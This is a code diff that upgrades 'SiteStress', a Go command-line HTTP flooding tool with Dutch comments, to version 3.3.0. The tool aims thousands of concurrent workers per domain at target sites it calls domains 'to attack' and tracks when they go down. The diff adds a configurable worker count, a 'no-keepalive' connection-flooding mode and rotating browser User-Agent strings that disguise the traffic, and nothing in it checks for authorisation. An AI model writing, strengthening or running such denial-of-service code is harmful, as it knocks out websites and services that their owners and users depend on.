@@ -4,6 +4,7 @@ import (
 	"flag"
 	"fmt"
 	"io"
+	"math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -18,15 +19,29 @@ import (
 	"github.com/miekg/dns"
 )
 
-const version = "3.2.7"
+const version = "3.3.0"
 
 func printBanner() {
 	fmt.Println("SiteStress (part of Lucas Kit) is made by Lucas Mangroelal | lucasmangroelal.nl")
 }
 
+var userAgents = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
+}
+
+func getRandomUserAgent() string {
+	return userAgents[rand.Intn(len(userAgents))]
+}
+
 type options struct {
 	domain        string
 	attackMinutes int
+	concurrency   int
+	noKeepAlive   bool
 	outputDir     string
 	help          bool
 	version       bool
@@ -49,6 +64,8 @@ func main() {
 
 	flag.StringVar(&o.domain, "d", "", "Domein(en) om aan te vallen (comma-separated, bijv. example.com,test.nl)")
 	flag.IntVar(&o.attackMinutes, "t", 0, "Aantal minuten om aan te vallen (vereist)")
+	flag.IntVar(&o.concurrency, "c", 1000, "Aantal gelijktijdige connecties (workers) per domein")
+	flag.BoolVar(&o.noKeepAlive, "no-keepalive", false, "Schakel keep-alive uit (forceer nieuwe connecties voor meer stress)")
 	flag.StringVar(&o.outputDir, "o", "", "Map om rapport en logs in op te slaan (optioneel)")
 	flag.BoolVar(&o.help, "help", false, "Toon help")
 	flag.BoolVar(&o.help, "h", false, "Toon help (kort)")
@@ -61,8 +78,8 @@ func main() {
 		fmt.Fprintf(os.Stderr, "  sitestress -d <domein> -t <minuten> [flags]\n\n")
 		fmt.Fprintf(os.Stderr, "Voorbeelden:\n")
 		fmt.Fprintf(os.Stderr, "  sitestress -d voorbeeld.nl -t 5\n")
-		fmt.Fprintf(os.Stderr, "  sitestress -d voorbeeld.nl -t 10 -o logs\n")
-		fmt.Fprintf(os.Stderr, "  sitestress -d domein1.nl,domein2.nl -t 5\n\n")
+		fmt.Fprintf(os.Stderr, "  sitestress -d voorbeeld.nl -t 10 -c 5000\n")
+		fmt.Fprintf(os.Stderr, "  sitestress -d voorbeeld.nl -t 5 -no-keepalive\n\n")
 		fmt.Fprintf(os.Stderr, "Flags:\n")
 		flag.PrintDefaults()
 	}
@@ -101,7 +118,7 @@ func main() {
 		}
 	}
 
-	runAttack(domains, o.attackMinutes, o.outputDir)
+	runAttack(domains, o)
 }
 
 func normalizeDomain(d string) string {
@@ -112,26 +129,28 @@ func normalizeDomain(d string) string {
 	return strings.TrimSuffix(d, ".")
 }
 
-func runAttack(domains []string, minutes int, outputDir string) {
-	duration := time.Duration(minutes) * time.Minute
+func runAttack(domains []string, o options) {
+	duration := time.Duration(o.attackMinutes) * time.Minute
 	deadline := time.Now().Add(duration)
 
-	// Meer power: meer connections per host en in totaal
-	workersPerDomain := 1000 // Was 300
-	if len(domains) > 1 {
-		workersPerDomain = 500
+	workersPerDomain := o.concurrency
+	// Safety check if user puts in something crazy low
+	if workersPerDomain < 1 {
+		workersPerDomain = 1
 	}
 
 	// Sterk getunede HTTP client
+	transport := &http.Transport{
+		MaxIdleConns:        workersPerDomain * len(domains),
+		MaxIdleConnsPerHost: workersPerDomain,
+		IdleConnTimeout:     90 * time.Second,
+		DisableKeepAlives:   o.noKeepAlive,
+		ForceAttemptHTTP2:   true,
+	}
+
 	httpClient := &http.Client{
-		Timeout: 4 * time.Second, // Iets kortere timeout voor snellere turnover
-		Transport: &http.Transport{
-			MaxIdleConns:        workersPerDomain * len(domains),
-			MaxIdleConnsPerHost: workersPerDomain,
-			IdleConnTimeout:     90 * time.Second,
-			DisableKeepAlives:   false,
-			ForceAttemptHTTP2:   true,
-		},
+		Timeout:   5 * time.Second,
+		Transport: transport,
 	}
 
 	// Setup DNS resolver (8.8.8.8 default)
@@ -174,7 +193,7 @@ func runAttack(domains []string, minutes int, outputDir string) {
 		var targetURL string
 		for _, u := range urls {
 			req, _ := http.NewRequest("GET", u, nil)
-			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; SiteStress/1.0)")
+			req.Header.Set("User-Agent", getRandomUserAgent())
 			resp, err := httpClient.Do(req)
 			if err == nil {
 				targetURL = u
@@ -194,7 +213,12 @@ func runAttack(domains []string, minutes int, outputDir string) {
 	}
 
 	fmt.Printf("\n🚀 Starten aanval (%d workers per domein)...\n", workersPerDomain)
-	fmt.Printf("⏱️  Totale tijd: %d minuten\n", minutes)
+	if o.noKeepAlive {
+		fmt.Println("🔥 Mode: No-KeepAlive (Connection flooding)")
+	} else {
+		fmt.Println("🌊 Mode: Keep-Alive (High throughput)")
+	}
+	fmt.Printf("⏱️  Totale tijd: %d minuten\n", o.attackMinutes)
 
 	var globalWg sync.WaitGroup
 
@@ -203,22 +227,18 @@ func runAttack(domains []string, minutes int, outputDir string) {
 			continue
 		}
 		s := stats
-		// Voor high-throughput, gebruiken we een semafoor of channel pattern
-		// Maar hier simpelweg N go routines die constant vuren
 		for w := 0; w < workersPerDomain; w++ {
 			globalWg.Add(1)
 			go func() {
 				defer globalWg.Done()
 
-				// Hergebruik buffer voor lezen body (weergave snelheid)
-				// buf := make([]byte, 1024)
-
 				for time.Now().Before(deadline) {
 					req, _ := http.NewRequest("GET", s.targetURL, nil)
-					// Random user agents zou beter zijn, maar keep simple for speed
-					req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+					req.Header.Set("User-Agent", getRandomUserAgent())
 					req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-					req.Header.Set("Connection", "keep-alive")
+
+					// Randomize connection header if keep alive is on, occasionally close to refresh?
+					// For now rely on transport settings.
 
 					resp, err := httpClient.Do(req)
 
@@ -227,7 +247,7 @@ func runAttack(domains []string, minutes int, outputDir string) {
 					s.mu.Unlock()
 
 					if err != nil {
-						// Connection error, timeout, etc -> often means site is struggling
+						// Connection error
 						if !isDown {
 							s.mu.Lock()
 							if !s.siteDown {
@@ -241,11 +261,10 @@ func runAttack(domains []string, minutes int, outputDir string) {
 						}
 						atomic.AddInt64(&s.failedRequests, 1)
 					} else {
-						// Leeg lezen om connectie vrij te maken
 						io.Copy(io.Discard, resp.Body)
 						resp.Body.Close()
 
-						if resp.StatusCode >= 500 || resp.StatusCode == 429 { // 429 = Too Many Requests
+						if resp.StatusCode >= 500 || resp.StatusCode == 429 {
 							if !isDown {
 								s.mu.Lock()
 								if !s.siteDown {
@@ -259,7 +278,7 @@ func runAttack(domains []string, minutes int, outputDir string) {
 							}
 							atomic.AddInt64(&s.failedRequests, 1)
 						} else {
-							// Status < 500 en geen error -> Site is UP
+							// Site is UP
 							if isDown {
 								s.mu.Lock()
 								if s.siteDown {
@@ -275,15 +294,13 @@ func runAttack(domains []string, minutes int, outputDir string) {
 						}
 					}
 					atomic.AddInt64(&s.totalRequests, 1)
-
-					// Geen sleep -> full throttle
 				}
 			}()
 		}
 	}
 
 	// Monitor loop
-	ticker := time.NewTicker(5 * time.Second)
+	ticker := time.NewTicker(2 * time.Second) // Sneller updaten voor leuk effect
 	defer ticker.Stop()
 
 	// Hier wachten we tot tijd voorbij is OF interrupt
@@ -331,11 +348,10 @@ loop:
 	}
 
 	fmt.Println("\n\n🛑 Tijd is om. Wachten op workers (kan even duren)...")
-	// Workers stoppen vanzelf omdat time.Now() > deadline checken
-	globalWg.Wait() // Hier niet oneindig wachten in echte wereld, maar voor CLI tool ok-ish
+	globalWg.Wait()
 
 	// Rapport genereren
-	generateReport(allStats, outputDir, minutes)
+	generateReport(allStats, o.outputDir, o.attackMinutes)
 }
 
 func generateReport(stats []*domainStats, outputDir string, minutes int) {
